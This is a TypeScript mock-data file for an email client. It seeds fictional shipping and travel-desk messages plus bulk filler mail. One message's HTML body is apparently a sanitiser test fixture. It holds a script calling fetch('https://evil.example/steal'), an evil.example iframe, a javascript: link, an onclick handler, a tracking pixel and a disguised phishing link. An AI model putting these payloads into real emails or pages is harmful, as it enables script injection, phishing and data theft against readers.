import type { Account, Attachment, FolderId, Message, Person } from '../types'

/** Mock data only. All names, addresses and references are fictional. */

export const ACCOUNTS: Account[] = [
  { id: 'me', name: 'Your Name', email: 'you@pivot.example', shared: false, signature: 'Your Name\nPivot' },
  { id: 'ops', name: 'Operations', email: 'ops@pivot.example', shared: true, signature: 'Operations Desk\nPivot Shipping' },
  { id: 'ticketing', name: 'Ticketing', email: 'ticketing@pivot.example', shared: true, signature: 'Ticketing Desk\nPivot Travel Management' },
]

export const LABELS = ['Clients', 'Vendors', 'Finance']

const NOW = Date.now()
const minutesAgo = (m: number): string => new Date(NOW - m * 60_000).toISOString()

const P = {
  acme: { name: 'Hana Okafor', email: 'hana@acme-trading.example' },
  blue: { name: 'Liam Verhoeven', email: 'liam@bluewave-lines.example' },
  gulf: { name: 'Sara Haddad', email: 'sara@gulfcargo.example' },
  sky: { name: 'Noor Rahman', email: 'noor@skyroutes.example' },
  fin: { name: 'Accounts Team', email: 'accounts@vendor-finance.example' },
  cust: { name: 'Diego Marín', email: 'diego@customs-agent.example' },
  trip: { name: 'Priya Nair', email: 'priya@horizon-corp.example' },
} satisfies Record<string, Person>

const att = (id: string, name: string, size: number): Attachment => ({
  id,
  name,
  size,
  mime: name.endsWith('.pdf') ? 'application/pdf' : name.endsWith('.xlsx') ? 'application/vnd.ms-excel' : 'application/octet-stream',
})

interface Seed {
  id: string
  thread: string
  account: string
  folder?: FolderId
  labels?: string[]
  from: Person
  to?: string
  cc?: string[]
  subject: string
  body: string
  html?: string
  ago: number
  unread?: boolean
  flagged?: boolean
  important?: boolean
  colour?: Message['colour']
  files?: Attachment[]
}

const seeds: Seed[] = [
  { id: 'm1', thread: 't1', account: 'ops', labels: ['Clients'], cc: ['accounts@pivot.example', 'sales@pivot.example'], important: true, from: P.acme, subject: 'Booking request – 2×40HQ machinery', body: 'Hello,\n\nWe would like to book 2×40HQ of machinery from the origin port to the destination port. Cargo is ready.\n\nPlease share your best rate and transit time.\n\nThanks,\nHana', ago: 8, unread: true, colour: 'orange', files: [att('a1', 'packing-list.pdf', 184_000), att('a2', 'commercial-invoice.pdf', 226_000)] },
  { id: 'm2', thread: 't2', account: 'ops', labels: ['Vendors'], from: P.blue, subject: 'Vessel schedule update', body: 'Dear team,\n\nPlease note the vessel schedule has changed. Updated cut-off and ETA are in the attached sheet.\n\nRegards,\nLiam', ago: 35, unread: true, flagged: true, files: [att('a3', 'schedule-update.xlsx', 48_000)] },
  { id: 'm3', thread: 't3', account: 'ops', labels: ['Clients'], important: true, from: P.cust, subject: 'Customs clearance – documents pending', body: 'Hi,\n\nWe are waiting for the original documents to complete clearance. Please confirm when they are couriered.\n\nDiego', ago: 95, unread: true, colour: 'red' },
  { id: 'm4', thread: 't4', account: 'ops', labels: ['Finance'], from: P.fin, subject: 'Statement of account – October', body: 'Dear customer,\n\nPlease find the October statement attached. Kindly arrange settlement per the agreed terms.\n\nAccounts', ago: 180, files: [att('a4', 'statement-oct.pdf', 92_000)] },
  { id: 'm5', thread: 't5', account: 'ops', labels: ['Clients'], cc: ['accounts@pivot.example'], from: P.gulf, subject: 'Re: Delivery order request', body: 'Thanks. Please issue the delivery order as discussed.\n\nSara\n\nOn Mon, 3 Nov 2025 at 10:12, Operations <ops@pivot.example> wrote:\n> We will issue it once the release is confirmed.\n>\n> Operations Desk', ago: 300, colour: 'green' },
  { id: 'm5b', thread: 't5', account: 'ops', labels: ['Clients'], from: P.gulf, subject: 'Delivery order request', body: 'Hello,\n\nCould you please issue the delivery order for the shipment arriving tomorrow?\n\nSara', ago: 1500, colour: 'green' },
  { id: 'm5c', thread: 't5', account: 'ops', folder: 'sent', labels: ['Clients'], from: { name: 'Operations', email: 'ops@pivot.example' }, to: 'sara@gulfcargo.example', subject: 'Re: Delivery order request', body: 'Hi Sara,\n\nWe will issue it once the release is confirmed.\n\nOperations Desk', ago: 1400 },
  { id: 'm6', thread: 't6', account: 'ticketing', important: true, from: P.trip, subject: 'Group travel – 12 passengers', body: 'Hello,\n\nWe need a quotation for 12 passengers travelling next month. Passport copies are attached.\n\nPriya', ago: 12, unread: true, colour: 'blue', files: [att('a5', 'passports.pdf', 1_240_000), att('a6', 'travel-request.xlsx', 36_000)] },
  { id: 'm7', thread: 't7', account: 'ticketing', from: P.sky, subject: 'Fare rules clarification', body: 'Dear team,\n\nPlease confirm the change and refund rules on the booking in question.\n\nNoor', ago: 140, unread: true },
  { id: 'm8', thread: 't8', account: 'ticketing', from: P.trip, subject: 'Re: Itinerary approval', body: 'Approved. Please proceed with ticketing.\n\nPriya', ago: 420, colour: 'purple' },
  { id: 'm9', thread: 't9', account: 'me', labels: ['Clients'], from: P.acme, subject: 'Quarterly review meeting', html: `<div>Hello,<br><br>Thursday 14:00 works for us. Please send an invite.<br><br>Hana</div><div class="gmail_quote"><div>On Mon, 3 Nov 2025 at 09:00, You &lt;you@pivot.example&gt; wrote:</div><blockquote style="border-left:1px solid #ccc;padding-left:8px">Can we schedule the quarterly review next week? Please share your availability.</blockquote></div>`, body: 'Hello,\n\nCan we schedule the quarterly review next week? Please share your availability.\n\nHana', ago: 60, unread: true },
  { id: 'm10', thread: 't10', account: 'me', labels: ['Finance'], from: P.fin, subject: 'Payment confirmation', body: 'Dear customer,\n\nWe confirm receipt of your payment. Thank you.\n\nAccounts', ago: 2900, files: [att('a7', 'receipt.pdf', 61_000)] },
  { id: 'm11', thread: 't11', account: 'me', from: P.blue, subject: 'Introducing our new service lanes', html: `<div style="font-family:Arial;color:#222"><h2 style="color:#162328">New service lanes</h2><p>Dear partner,</p><p>We are pleased to announce <b>additional service lanes</b> starting next quarter. <a href="https://bluewave-lines.example/lanes">View the lane map</a>.</p><img src="https://tracker.example/pixel.gif?u=1" width="1" height="1" alt=""><img src="https://bluewave-lines.example/banner.png" alt="Lane map" width="320"><table border="1" cellpadding="6"><tr><th>Lane</th><th>Start</th></tr><tr><td>Jebel Ali – Rotterdam</td><td>Jan</td></tr></table><p>Phishing check: <a href="https://evil.example/login">https://bank.example/secure</a></p><script>document.title='pwned';fetch('https://evil.example/steal')</script><iframe src="https://evil.example"></iframe><p onclick="alert(1)" style="position:fixed;top:0;font-size:12px;color:#c00">Styled text</p><a href="javascript:alert(1)">Bad link</a><p>Liam</p></div>`, body: 'Dear partner,\n\nWe are pleased to announce additional service lanes starting next quarter.\n\nLiam', ago: 4300 },
  { id: 'm12', thread: 't12', account: 'me', folder: 'drafts', from: { name: 'Your Name', email: 'you@pivot.example' }, to: 'hana@acme-trading.example', subject: 'Draft: rate proposal', body: 'Hi Hana,\n\n[draft in progress]', ago: 200 },
  { id: 'm13', thread: 't13', account: 'me', folder: 'archive', from: P.sky, subject: 'Archived: last season schedule', body: 'For reference.\n\nNoor', ago: 9000 },
]

const accountOf = (id: string): Account => ACCOUNTS.find((a) => a.id === id) ?? (ACCOUNTS[0] as Account)

const mapped: Message[] = seeds.map((s) => ({
  id: s.id,
  threadId: s.thread,
  accountId: s.account,
  folder: s.folder ?? 'inbox',
  labels: s.labels ?? [],
  from: s.from,
  to: [{ name: s.to ?? accountOf(s.account).name, email: s.to ?? accountOf(s.account).email }],
  cc: s.cc?.map((e) => ({ name: e, email: e })),
  subject: s.subject,
  body: s.body,
  html: s.html,
  date: minutesAgo(s.ago),
  unread: s.unread ?? false,
  flagged: s.flagged ?? false,
  important: s.important ?? false,
  colour: s.colour,
  attachments: s.files ?? [],
}))

/** Bulk filler so list virtualisation/speed can be felt. */
const FILLER_SUBJECTS = ['Shipment status', 'Invoice query', 'Booking confirmation', 'Amendment request', 'Documents received', 'Rate enquiry']
const FILLER_PEOPLE: Person[] = Object.values(P)
const filler: Message[] = Array.from({ length: 240 }, (_, i) => {
  const from = FILLER_PEOPLE[i % FILLER_PEOPLE.length] as Person
  const subject = `${FILLER_SUBJECTS[i % FILLER_SUBJECTS.length]} #${1000 + i}`
  return {
    id: `f${i}`,
    threadId: `ft${i}`,
    accountId: i % 3 === 0 ? 'ops' : i % 3 === 1 ? 'ticketing' : 'me',
    folder: 'inbox',
    labels: [],
    from,
    to: [{ name: accountOf(i % 3 === 0 ? 'ops' : i % 3 === 1 ? 'ticketing' : 'me').name, email: accountOf(i % 3 === 0 ? 'ops' : i % 3 === 1 ? 'ticketing' : 'me').email }],
    subject,
    body: `Hello,\n\nRegarding ${subject.toLowerCase()}. Please advise at your earliest convenience.\n\n${from.name}`,
    date: minutesAgo(600 + i * 55),
    unread: false,
    flagged: false,
    attachments: i % 5 === 0 ? [att(`fa${i}`, `document-${i}.pdf`, 80_000 + i * 900)] : [],
  } satisfies Message
})

export const INITIAL_MESSAGES: Message[] = [...mapped, ...filler]
